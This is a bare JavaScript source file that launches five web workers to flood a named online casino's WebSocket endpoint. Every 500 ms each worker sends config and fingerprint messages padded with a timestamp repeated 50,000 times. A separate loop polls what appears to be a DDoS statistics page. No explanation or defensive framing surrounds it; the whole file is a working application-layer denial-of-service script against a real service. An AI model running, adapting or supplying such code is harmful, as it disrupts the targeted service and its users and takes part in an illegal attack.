const workerCode = `
const msg1 = {
    "functionName": "getConfig",
    "data": {
        "childPlatformId": "50",
        "isReload": false,
        "requestId": "RQ2",
        "deviceType": 1,
        "deviceId": "",
        "platformId": "50",
        "version": "2.1.44",
        "test_cfg_0723": Date.now().toString().repeat(50000),
        "uuid": "10000000-1000-4000-8000-100000000000".replace(/[018]/g, er => (+er ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> +er / 4).toString(16))
    },
    "service": "platform"
}

const msg2 = {
    functionName: "setFingerprint",
    service: "connection",
    data: {
        childPlatformId: "50",
        components: Date.now().toString().repeat(50000),
        deviceId: "",
        deviceType: 1,
        platformId: "50",
        requestId: "RQ33",
        uuid: "10000000-1000-4000-8000-100000000000".replace(/[018]/g, er => (+er ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> +er / 4).toString(16)),
        version: "2.1.44",
        visitorId: Date.now().toString(),
    }
}

let socket = null;
let interval = null;

onmessage = function (e) {
    const index = e.data.index ?? 0;
    const url = 'wss://cp-ws.casinoplus.top/websocket';

    socket = new WebSocket(url);

    socket.onopen = function () {
        console.log('Worker ' + index + ' connected');

        interval = setInterval(() => {
            if (socket.readyState === WebSocket.OPEN) {
                socket.send(JSON.stringify(msg1));
                socket.send(JSON.stringify(msg2));
            }
        }, 500);
    };

    socket.onerror = function (err) {
        console.error('Worker ' + index + ' WebSocket error:', err);
    };

    socket.onclose = function () {
        console.warn('Worker ' + index + ' WebSocket closed');
        clearInterval(interval);
    };
};
`;

const blob = new Blob([workerCode], { type: 'application/javascript' });
const workerUrl = URL.createObjectURL(blob);

for (let i = 0; i < 5; i++) {
    const worker = new Worker(workerUrl);
    worker.postMessage({ index: i });
}

setInterval(function () {
    fetch('https://layer7.wiki/dstat0723');
}, 1000);